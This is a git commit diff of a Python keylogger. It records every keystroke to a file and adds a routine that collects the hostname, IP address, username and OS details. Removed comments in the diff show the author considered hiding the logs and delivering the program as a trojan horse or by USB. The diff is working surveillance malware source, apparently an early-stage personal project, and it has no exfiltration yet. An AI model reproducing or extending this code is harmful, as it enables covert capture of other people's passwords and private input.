f25b9689a3507c9033bae543033f969147507d03
Alejandro Sandoval <asandoval2540@gmail.com>
2026-03-01 13:57:41 -0600

    Add files via upload

--- Main.py
+++ Main.py
@@ -3,27 +3,41 @@
 #Import Modules
 import pynput
 from pynput import keyboard
+import platform # Get system info (for sys_info)
+import socket # Get network info (for sys_info)
+import getpass # Get username (for sys_info)
 
-# How do you make sure the user doesn't see this? ** Hidden files **
-# Also this doesn't gurantee that there is a log.txt - 
-# Figure out how to get special characters - DONE
+
+key_info = "key_log.txt" # text file for key presses
+sys_info = "sys_info.txt" # text file for os info 
+
 
 #Function to log key presses
 def Keypress(key):
     print(str(key))
-    with open("log.txt", "a") as logKey:   #Open log file to append to
+    with open(key_info, "a") as logKey:   #Open log file to append to
         try:
             char = key.char
             logKey.write(char)
         except AttributeError:
-            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. It will write them in brackets and remove the "Key." part for better readability.
+            logKey.write(f"[{str(key).replace('Key.', '')}]") # This is for special keys like space, enter, etc. To make it look more neat, .replace will remove the Key. from the log file
+
+#Function to log system information
+def system_information():
+    with open(sys_info, "w") as logSys: #recalling the file we made earlier so that it can start writing to it
+        logSys.write(f"System: {platform.system()} {platform.release()}\n")
+        logSys.write(f"Network Name: {platform.node()}\n")
+        logSys.write(f"Machine: {platform.machine()}\n")
+        logSys.write(f"Processor: {platform.processor()}\n")
+        logSys.write(f"Hostname: {socket.gethostname()}\n")
+        logSys.write(f"IP Address: {socket.gethostbyname(socket.gethostname())}\n")
+        logSys.write(f"Username: {getpass.getuser()}\n") # everything from line 28 to 34 is for system information, look at the name to see what it will capture...
 
 
-# Software or hardware implemented? 
-# USB, inject it into a software, or make trojan horse
 #Main function (Used to listen)        
 if __name__ == "__main__":
     listner = keyboard.Listener(on_press=Keypress)
     listner.start()
+    system_information()
     input()
 
